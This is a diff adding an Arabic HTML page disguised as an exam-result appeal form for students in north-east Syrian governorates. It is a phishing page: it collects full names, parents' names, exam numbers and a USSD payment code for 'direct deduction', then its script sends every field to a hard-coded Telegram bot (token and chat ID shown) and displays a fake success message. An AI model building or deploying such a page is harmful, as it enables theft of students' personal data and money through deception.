@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج اعتراض</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #fbeee0, #fff);
+      direction: rtl;
+      padding: 20px;
+    }
+    h2 {
+      color: #8b0000;
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 28px;
+    }
+    .note {
+      text-align: center;
+      color: #444;
+      font-size: 16px;
+      margin-bottom: 25px;
+      background-color: #fff8f0;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #e0c4b0;
+    }
+    form {
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 15px;
+      max-width: 650px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(139,0,0,0.2);
+      border: 2px solid #8b0000;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #333;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input::placeholder {
+      color: #888;
+      font-size: 14px;
+    }
+    textarea {
+      resize: vertical;
+    }
+    .success {
+      color: #006400;
+      font-size: 16px;
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+    button {
+      margin-top: 25px;
+      padding: 12px;
+      background-color: #8b0000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 18px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #a30000;
+    }
+  </style>
+</head>
+<body>
+
+<h2>📄 نموذج اعتراض</h2>
+<div class="note">
+  يسرنا مساعدتكم في تقديم اعتراضات خاصة لأهل المنطقة الشرقية.<br>
+  عزيزي الطالب، عزيزتي الطالبة... الرجاء إدخال البيانات كاملة، وسوف يتم إبلاغكم في حال أدت طلبات الاعتراض إلى تعديل النتيجة.<br>
+  وفي حال لم يكن هنالك تعديل، لن يتم عرض معلومات اسم المعترض أو رقمه.
+</div>
+
+<form id="objectionForm">
+  <label>الاسم الثلاثي:</label>
+  <input type="text" name="fullname" required>
+
+  <label>اسم الأب:</label>
+  <input type="text" name="fathername" required>
+
+  <label>الكنية:</label>
+  <input type="text" name="lastname" required>
+
+  <label>اسم الأم:</label>
+  <input type="text" name="mothername" required>
+
+  <label>رقم الاكتتاب:</label>
+  <input type="text" name="examNumber" required>
+
+  <label>المحافظة:</label>
+  <select name="governorate" required>
+    <option value="">اختر المحافظة</option>
+    <option>الحسكة</option>
+    <option>القامشلي</option>
+    <option>الرقة</option>
+    <option>الطبقة</option>
+    <option>صرين</option>
+    <option>مجمع خشام</option>
+  </select>
+
+  <label>المواد المعترض عليها:</label>
+  <textarea name="subjects" rows="3" required></textarea>
+
+  <label>كود USSD للسداد المباشر:</label>
+  <input type="text" name="ussdCode" placeholder="الرجاء إدخال رقم USSD لاستقطاع المبلغ" required>
+
+  <button type="submit">📤 إرسال الطلب</button>
+  <div class="success" id="successMsg">✅ تم تقديم طلب الاعتراض الخاص بك. سيتم إبلاغك بالنتيجة في حال تم تعديلها.</div>
+</form>
+
+<script>
+  document.getElementById('objectionForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(this);
+    let message = "📌 طلب اعتراض جديد:\n";
+    for (let [key, value] of formData.entries()) {
+      message += `• ${key}: ${value}\n`;
+    }
+
+    fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: 7493001551,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        document.getElementById('successMsg').style.display = 'block';
+        document.getElementById('objectionForm').reset();
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
